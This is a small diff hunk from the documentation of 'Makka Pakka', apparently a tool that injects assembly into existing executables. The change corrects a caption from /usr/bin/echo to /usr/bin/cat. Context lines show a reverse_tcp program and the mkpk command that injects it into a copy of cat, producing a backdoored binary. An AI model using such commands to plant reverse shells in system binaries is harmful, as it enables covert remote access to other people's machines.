@@ -89,7 +89,7 @@ addr: 0x0100007f
 > sys_exit
 ```
 
-Compiling the Makka Pakka program into /usr/bin/echo:
+Compiling the Makka Pakka program into /usr/bin/cat:
 ```
 mkpk reverse_tcp.mkpk /usr/bin/cat -e -o cat_inject
 Injecting assembly from cat_inject.asm into cat_inject.
